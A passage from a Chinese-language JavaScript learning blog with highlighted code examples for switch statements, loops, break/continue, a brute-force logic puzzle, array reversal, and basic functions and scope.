class="comment">//     //console.log(&quot;非数字&quot;)</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     alert(&quot;写数字&quot;)</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//switch分支，switch能写的if也可以，if场景更多</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> x=prompt(<span class="string">&quot;星期几？&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">switch</span> (x) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">case</span> <span class="string">&quot;星期一&quot;</span>:</span></span><br><span class="line"><span class="javascript">                alert(<span class="string">&quot;今天是周一&quot;</span>)</span></span><br><span class="line"><span class="javascript">                <span class="keyword">break</span>;<span class="comment">//打断</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">case</span> <span class="string">&quot;星期二&quot;</span>:</span></span><br><span class="line"><span class="javascript">                alert(<span class="string">&quot;今天是周二&quot;</span>)</span></span><br><span class="line"><span class="javascript">                <span class="keyword">break</span>;<span class="comment">//打断</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">case</span> <span class="string">&quot;星期三&quot;</span>:</span></span><br><span class="line"><span class="javascript">                alert(<span class="string">&quot;今天是周三&quot;</span>)</span></span><br><span class="line"><span class="javascript">                <span class="keyword">break</span>;<span class="comment">//打断</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">case</span> <span class="string">&quot;星期四&quot;</span>:</span></span><br><span class="line"><span class="javascript">                alert(<span class="string">&quot;今天是周四&quot;</span>)</span></span><br><span class="line"><span class="javascript">                <span class="keyword">break</span>;<span class="comment">//打断</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">case</span> <span class="string">&quot;星期五&quot;</span>:</span></span><br><span class="line"><span class="javascript">                alert(<span class="string">&quot;今天是周五&quot;</span>)</span></span><br><span class="line"><span class="javascript">                <span class="keyword">break</span>;<span class="comment">//打断</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">default</span>:<span class="comment">//相当于if中的else</span></span></span><br><span class="line"><span class="javascript">                alert(<span class="string">&quot;今天是周末&quot;</span>)</span></span><br><span class="line"><span class="javascript">                <span class="keyword">break</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="day9-循环控制"><a href="#day9-循环控制" class="headerlink" title="day9 循环控制"></a>day9 循环控制</h2><h3 id="for-for-in"><a href="#for-for-in" class="headerlink" title="for    for in"></a>for    for in</h3><h3 id="while-do-while"><a href="#while-do-while" class="headerlink" title="while    do while"></a>while    do while</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>day9 js循环控制<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//循环语句 for   for in  while   do while</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;<span class="number">10</span>;i++)<span class="comment">//与C++相同</span></span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(i+<span class="string">&quot;&lt;br/&gt;&quot;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(i);</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="comment">//死循环会导致浏览器崩溃</span></span></span><br><span class="line">        </span><br><span class="line"><span class="javascript">        <span class="comment">//遍历数组中数据</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> arr=[<span class="string">&quot;hhh&quot;</span>,<span class="string">&quot;嘿嘿嘿&quot;</span>,<span class="string">&quot;嘻嘻嘻&quot;</span>,<span class="string">&quot;呵呵呵&quot;</span>,<span class="string">&quot;哈哈哈&quot;</span>]</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;arr.length;i++)</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(arr[i]);</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">&quot;&lt;br/&gt;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//九九乘法表</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;<span class="number">10</span>;i++)</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">            <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">1</span>;j&lt;=i;j++)</span></span><br><span class="line">            &#123;</span><br><span class="line">                if ((j == 3 &amp;&amp; i == 3) || (j == 3 &amp;&amp; i == 4)) &#123;</span><br><span class="line"><span class="javascript">                    <span class="built_in">document</span>.write(<span class="string">&quot;&amp;nbsp;&amp;nbsp;&quot;</span>)</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.write(j+<span class="string">&quot;x&quot;</span>+i+<span class="string">&quot;=&quot;</span>+i*j+<span class="string">&quot;&amp;nbsp;&amp;nbsp;&quot;</span>);</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(<span class="string">&quot;&lt;br/&gt;&quot;</span>)</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//for in 用法，用来遍历，遍历数组中的元素和对象中的属性</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> arr)</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(arr[i]);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> obj=&#123;</span></span><br><span class="line"><span class="javascript">            name:<span class="string">&quot;逍遥&quot;</span>,</span></span><br><span class="line"><span class="javascript">            age:<span class="string">&quot;22&quot;</span>,</span></span><br><span class="line"><span class="javascript">            hobby:<span class="string">&quot;music&quot;</span>,</span></span><br><span class="line"><span class="javascript">            pet:<span class="string">&quot;靓仔&quot;</span></span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">&quot;&lt;br/&gt;&quot;</span>)</span></span><br><span class="line"><span class="javascript">        <span class="comment">//遍历obj中的属性</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> obj)</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(obj[i]);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//while </span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> x=<span class="number">1</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">while</span> (x&lt;<span class="number">10</span>) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(<span class="string">&quot;00000000&quot;</span>+<span class="string">&quot;&lt;br/&gt;&quot;</span>);</span></span><br><span class="line"><span class="javascript">            x++;<span class="comment">//while很容易漏掉x++从而陷入死循环</span></span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//do while</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> i=<span class="number">1</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">do</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(<span class="string">&quot;人生有时就像循环，只有不断的努力才能跳出循环&quot;</span>)</span></span><br><span class="line">            i++;</span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">while</span> (i&lt;<span class="number">10</span>);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="day10-break-continue"><a href="#day10-break-continue" class="headerlink" title="day10 break continue"></a>day10 break continue</h2><h3 id="break"><a href="#break" class="headerlink" title="break"></a>break</h3><h3 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h3><h3 id="两个小题目"><a href="#两个小题目" class="headerlink" title="两个小题目"></a>两个小题目</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>day10 break continue<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//python应用 引发一个思考：暴力解法是否在鲁棒性上更有优势？</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//某侦察队受到一项紧急任务，要求在ABCDEF六个队员中尽可能多地挑若干人，但有以下约束条件：</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// A和B两人至少去一人</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// A和D不能一起去</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// AEF三人中要派两人去</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// BC都去或者都不去</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// CD两人中去一个</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// DE不去</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">var</span> a=<span class="number">0</span>;a&lt;=<span class="number">1</span>;a++)&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span>(<span class="keyword">var</span> b=<span class="number">0</span>;b&lt;=<span class="number">1</span>;b++)&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">for</span>(<span class="keyword">var</span> c=<span class="number">0</span>;c&lt;=<span class="number">1</span>;c++)&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">for</span>(<span class="keyword">var</span> d=<span class="number">0</span>;d&lt;=<span class="number">1</span>;d++)&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="keyword">for</span>(<span class="keyword">var</span> e=<span class="number">0</span>;e&lt;=<span class="number">1</span>;e++)&#123;</span></span><br><span class="line"><span class="javascript">                            <span class="keyword">for</span>(<span class="keyword">var</span> f=<span class="number">0</span>;f&lt;=<span class="number">1</span>;f++)&#123;</span></span><br><span class="line">                                if(a+b&gt;0&amp;&amp;a+d!=2&amp;&amp;a+e+f==2&amp;&amp;b==c&amp;&amp;c+d==1&amp;&amp;d+e==0)&#123;</span><br><span class="line"><span class="javascript">                                    <span class="built_in">document</span>.write(<span class="string">&quot;a=&quot;</span> + a + <span class="string">&quot;&lt;br&gt;b=&quot;</span> + b + <span class="string">&quot;&lt;br&gt;c=&quot;</span>+c + <span class="string">&quot;&lt;br&gt;d=&quot;</span> + d + <span class="string">&quot;&lt;br&gt;e=&quot;</span>+ e + <span class="string">&quot;&lt;br&gt;f=&quot;</span> + f + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//break 用法和c++一样，跳出循环，switch分支结束</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span></span><br><span class="line">        &#123;</span><br><span class="line">            if(i==5)&#123;</span><br><span class="line"><span class="javascript">                <span class="keyword">break</span>;</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(i);</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">&quot;&lt;br&gt;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//continue 跳跃当前循环，continue下面不执行，开始下一次循环</span></span></span><br><span class="line"><span class="javascript">         <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span></span><br><span class="line">            if (i == 5) &#123;</span><br><span class="line"><span class="javascript">                <span class="keyword">continue</span>;<span class="comment">//打断，跳到下一个循环</span></span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(i);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//数组翻转,temp逐个翻转或者开一个新数组</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> arr=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> temp;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;=<span class="built_in">parseInt</span>(arr.length/<span class="number">2</span>);i++)</span></span><br><span class="line">        &#123;</span><br><span class="line">            temp=arr[i];</span><br><span class="line">            arr[i]=arr[arr.length-1-i];</span><br><span class="line">            arr[arr.length-1-i]=temp;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">&quot;&lt;br&gt;&quot;</span>+arr);</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="day11-函数"><a href="#day11-函数" class="headerlink" title="day11 函数"></a>day11 函数</h2><h3 id="小练习：菱形"><a href="#小练习：菱形" class="headerlink" title="小练习：菱形"></a>小练习：菱形</h3><h3 id="函数定义-形参与实参"><a href="#函数定义-形参与实参" class="headerlink" title="函数定义 形参与实参"></a>函数定义 形参与实参</h3><h3 id="作用域-全局变量-局部变量"><a href="#作用域-全局变量-局部变量" class="headerlink" title="作用域 全局变量 局部变量"></a>作用域 全局变量 局部变量</h3><h3 id="释放内存"><a href="#释放内存" class="headerlink" title="释放内存"></a>释放内存</h3><h3 id="生命提升"><a href="#生命提升" class="headerlink" title="生命提升"></a>生命提升</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>day11 js函数<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//小练习：用*画个9层高的菱形</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span> - i; k++)<span class="comment">//空格</span></span></span><br><span class="line">            &#123;</span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.write(<span class="string">&quot;&amp;nbsp;&amp;nbsp;&quot;</span>);</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> x = <span class="number">0</span>; x &lt; i * <span class="number">2</span> - <span class="number">1</span>; x++) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.write(<span class="string">&quot;*&quot;</span>);</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(<span class="string">&quot;&lt;br/&gt;&quot;</span>)</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">3</span>; i &gt; <span class="number">0</span> ; i--) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">for</span> (<span class="keyword">var</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span> - i; k++)<span class="comment">//空格</span></span></span><br><span class="line">                &#123;</span><br><span class="line"><span class="javascript">                    <span class="built_in">document</span>.write(<span class="string">&quot;&amp;nbsp;&amp;nbsp;&quot;</span>);</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="javascript">                <span class="keyword">for</span> (<span class="keyword">var</span> x = <span class="number">0</span>; x &lt; i * <span class="number">2</span> - <span class="number">1</span>; x++) &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">document</span>.write(<span class="string">&quot;*&quot;</span>);</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.write(<span class="string">&quot;&lt;br/&gt;&quot;</span>)</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="comment">//函数</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//定义，调用，参数，返回值，作用域，变量，释放内存，预解析</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//官方定义：是由事件驱动或当它被调用时可以重复使用的代码</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="comment">//函数定义</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//1、函数声明定义,除了声明function和C++不一样，形参，实参传递以及return都与C++相似</span></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>)</span></span></span><br><span class="line">            &#123;</span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.write(<span class="string">&quot;js的函数&quot;</span>);</span></span><br><span class="line">            &#125;</span><br><span class="line">            fun();</span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">fun2</span>(<span class="params">a,b</span>)//形参</span></span></span><br><span class="line">            &#123;</span><br><span class="line">                if(a&gt;b)&#123;</span><br><span class="line"><span class="javascript">                    <span class="built_in">document</span>.write(a+<span class="string">&quot;大于&quot;</span>+b);</span></span><br><span class="line"><span class="javascript">                &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">document</span>.write(a+<span class="string">&quot;不大于&quot;</span>+b);</span></span><br><span class="line">                &#125;;</span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.write(<span class="string">&quot;&lt;br&gt;&quot;</span>)</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            fun2(<span class="number">1</span>,<span class="number">2</span>)<span class="comment">//实参</span></span></span><br><span class="line">            fun2(59,23)</span><br><span class="line"><span class="javascript">            <span class="comment">//如果实参数目多余形参，那么函数无法接收多余的实参</span></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">fun3</span>(<span class="params">x,y,z</span>)</span></span></span><br><span class="line">            &#123;</span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.write(+x + y + z)</span></span><br><span class="line">            &#125;;</span><br><span class="line">            fun3(1,2,3);</span><br><span class="line"><span class="javascript">            fun3(<span class="number">1</span>,<span class="number">2</span>)<span class="comment">//NAN,因为形参z是undefined就是NAN类型</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="comment">//return</span></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">fun4</span>(<span class="params">a,b</span>)</span></span></span><br><span class="line">            &#123;</span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> a+b;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.write(<span class="string">&quot;aaa&quot;</span>);<span class="comment">//return 后面的代码不执行</span></span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> index=fun4(<span class="number">3</span>,<span class="number">4</span>)</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(index);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="comment">//作用域 局部变量和全局变量，和C++一样</span></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">fun5</span>(<span class="params"></span>)</span></span></span><br><span class="line">            &#123;</span><br><span class="line">                x=10;</span><br><span class="line">                y=20;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            fun5();<span class="comment">//在函数体内x没有经过var定义，函数经过一次调用后，x就成为全局变量，这就叫隐式全局变量</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(x);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="comment">//生命周期：变量从出生到删除</span></span></span><br><span class="line"><span class="javascript">            <span 